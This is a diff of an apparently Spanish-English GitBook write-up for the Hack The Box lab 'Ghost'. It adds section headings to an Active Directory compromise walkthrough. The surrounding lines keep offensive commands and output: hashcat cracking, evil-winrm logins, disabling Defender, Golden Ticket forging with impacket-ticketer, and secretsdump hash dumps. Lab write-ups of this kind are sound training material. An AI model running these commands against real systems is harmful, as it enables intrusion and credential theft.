@@ -23,6 +23,10 @@ layout:
 
 
 
+## Reconnaissance
+
+
+
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.11.24 -oG allPorts
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
@@ -245,6 +249,10 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 
 
+## Web Enumeration
+
+
+
 ```bash
 ❯ whatweb http://ghost.htb
 http://ghost.htb [404 Not Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-HTTPAPI/2.0], IP[10.10.11.24], Microsoft-HTTPAPI[2.0], Title[Not Found]
@@ -298,6 +306,14 @@ https://ghost.htb:8443/login [200 OK] Cookies[connect.sid], Country[RESERVED][ZZ
 
 
 <figure><img src="../../.gitbook/assets/imagen (7) (1).png" alt=""><figcaption></figcaption></figure>
+
+
+
+## Shell as Root
+
+
+
+### LDAP Injection
 
 
 
@@ -428,6 +444,10 @@ print(f"[🔓] Contraseña final: {password}")
 
 
 
+### Ghost Blog Vulnerabilities
+
+
+
 <figure><img src="../../.gitbook/assets/imagen (17).png" alt=""><figcaption></figcaption></figure>
 
 
@@ -449,6 +469,8 @@ posts-public.js
 <figure><img src="../../.gitbook/assets/imagen (25).png" alt=""><figcaption></figcaption></figure>
 
 
+
+### Using the Ghost API to retrieve Path Traversal vulnerability information
 
 {% embed url="https://ghost.org/docs/content-api/" %}
 
@@ -519,6 +541,8 @@ Si un proceso con permisos elevados expone su /proc/self/environ, un atacante po
 <figure><img src="../../.gitbook/assets/imagen (27).png" alt=""><figcaption></figcaption></figure>
 
 
+
+### Using the Ghost API to perform command injection and gain access to the Docker machine
 
 intranet
 
@@ -738,6 +762,12 @@ hostname -I
 
 
 
+## Shell as Florence.Ramirez
+
+
+
+### Information leaked in environment variables (env)
+
 ```bash
 root@36b733906694:/app# env
 SHELL=bash
@@ -791,6 +821,8 @@ LDAP        10.10.11.24     389    DC01             Compressing output into /hom
 
 
 
+### Session Hijacking via SSH Control Socket
+
 ```bash
 root@36b733906694:/# ls -l
 total 76
@@ -815,6 +847,7 @@ dr-xr-xr-x  13 root root    0 Feb  7 17:46 sys
 drwxrwxrwt   1 root root 4096 Jul  5  2024 tmp
 drwxr-xr-x   1 root root 4096 Jul  1  2024 usr
 drwxr-xr-x   1 root root 4096 Jul  1  2024 var
+
 root@36b733906694:/# cat docker-entrypoint.sh 
 #!/bin/bash
 
@@ -824,6 +857,10 @@ printf 'Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/controlmaster/%%r@%%h
 
 exec /app/ghost_intranet
 ```
+
+
+
+
 
 
 
@@ -847,6 +884,10 @@ florence.ramirez@LINUX-DEV-WS01:~$ hostname -I
 florence.ramirez@LINUX-DEV-WS01:~$ id
 uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
 ```
+
+
+
+### Reusing a Valid TGT for Lateral Movement
 
 
 
@@ -922,7 +963,11 @@ SMB         10.10.11.24     445    DC01             [+] ghost.htb\florence.ramir
 
 
 
+## Shell as justin.bradley
 
+
+
+### DNS Spoofing to Capture NTLMv2 Hash from User Attempting to Access Bitbucket
 
 <figure><img src="../../.gitbook/assets/4590_vmware_FS9P8EQFLV.png" alt=""><figcaption></figcaption></figure>
 
@@ -978,6 +1023,8 @@ SRV: dc01.ghost.htb:88
 
 
 
+
+
 ```bash
 ❯ hashcat -a 0 hashes /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting in autodetect mode
@@ -1005,6 +1052,8 @@ WINRM       10.10.11.24     5985   DC01             [+] ghost.htb\justin.bradley
 
 
 
+### Abusing WinRM -EvilWinRM
+
 ```bash
 ❯ evil-winrm -i 10.10.11.24 -u 'justin.bradley' -p 'Qwertyuiop1234$$'
                                         
@@ -1021,6 +1070,10 @@ Info: Establishing connection to remote endpoint
 
 
 
+## BloodHound Enumeration
+
+
+
 BLOODHOUND
 
 
@@ -1030,6 +1083,14 @@ BLOODHOUND
 
 
 <figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
+
+
+
+## Shell as ADFS\_GMSA$
+
+
+
+### Abusing ReadGMSAPassword (PowerView.py)
 
 
 
@@ -1081,6 +1142,10 @@ Info: Establishing connection to remote endpoint
 ```
 
 
+
+## Shell as mssqlserver
+
+### Active Directory Federation Services (ADFS) - Golden SAML  Attack
 
 {% embed url="https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adfs-federation-services/" %}
 
@@ -1341,6 +1406,12 @@ nt service\mssqlserver
 
 
 
+## Shell as SYSTEM
+
+
+
+### Abusing SeImpersonatePrivilege (EfsPotato)
+
 ```bash
 PS C:\ProgramData> hostname
 hostname
@@ -1534,6 +1605,18 @@ nt authority\system
 
 
 
+
+
+## Privilege Escalation (Method 1)
+
+
+
+
+
+### Golden Ticket Attack
+
+
+
 ```powershell
 PS C:\ProgramData> Set-MpPreference -DisableRealtimeMonitoring $True
 ```
@@ -1710,11 +1793,19 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 
 
+<figure><img src="../../.gitbook/assets/imagen (329).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (328).png" alt=""><figcaption></figcaption></figure>
+
 
 
 <figure><img src="../../.gitbook/assets/imagen (11).png" alt=""><figcaption></figcaption></figure>
 
 
+
+### Exploiting Network Access with Ligolo-ng to Share corp.ghost.htb
 
 ```bash
 ❯ /opt/ligolo/proxy -selfcert
@@ -1802,6 +1893,17 @@ ligolo-ng » session
 
 
 
+```
+❯ cat /etc/hosts | grep corp.ghost.htb
+10.0.0.10 corp.ghost.htb
+```
+
+
+
+### Generating Custom Golden Ticket for Administrator in corp.ghost.htb
+
+
+
 ```bash
 ❯ impacket-ticketer -aesKey b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d -domain-sid S-1-5-21-2034262909-2733679486-179904498 -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 -domain corp.ghost.htb Administrator 2>/dev/null
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -1835,6 +1937,10 @@ Valid starting     Expires            Service principal
 
 
 
+### Dumping Domain Credentials and NTDS Secrets from DC01 in corp.ghost.htb
+
+
+
 ```
 ❯ secretsdump.py dc01.ghost.htb -k -no-pass -just-dc-ntlm
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -1859,7 +1965,7 @@ DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6c3d61860f92e30e8e9744ac5d9783b:::
 LINUX-DEV-WS01$:3630:aad3b435b51404eeaad3b435b51404ee:be14220f3b71b34a61d2d516d595555c:::
 adfs_gmsa$:4101:aad3b435b51404eeaad3b435b51404ee:0bef79ae4d25b1864570212e33922d14:::
 GHOST-CORP$:2101:aad3b435b51404eeaad3b435b51404ee:be0a51897087a382ca0726b2403e6b00:::
-[*] Cleaning up... 
+[*] Cleaning up...
 
 ```
 
@@ -1885,9 +1991,21 @@ Info: Establishing connection to remote endpoint
 
 
 
-OTRO METODO
+## Privilege Escalation (Method 2)
+
+### Parent Domain Compromise and SID History Injection Attack
 
 
+
+<figure><img src="../../.gitbook/assets/imagen (333).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (332).png" alt=""><figcaption></figcaption></figure>
+
+
+
+<figure><img src="../../.gitbook/assets/imagen (334).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -2210,6 +2328,10 @@ PS C:\ProgramData> cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
 cat \\DC01.ghost.htb\C$\Users\Administrator\Desktop\root.txt
 9aa9bfa25a6aa3ef5e12ae399ac93d51
 ```
+
+
+
+### Shell as Ghost Administrator
 
 
 
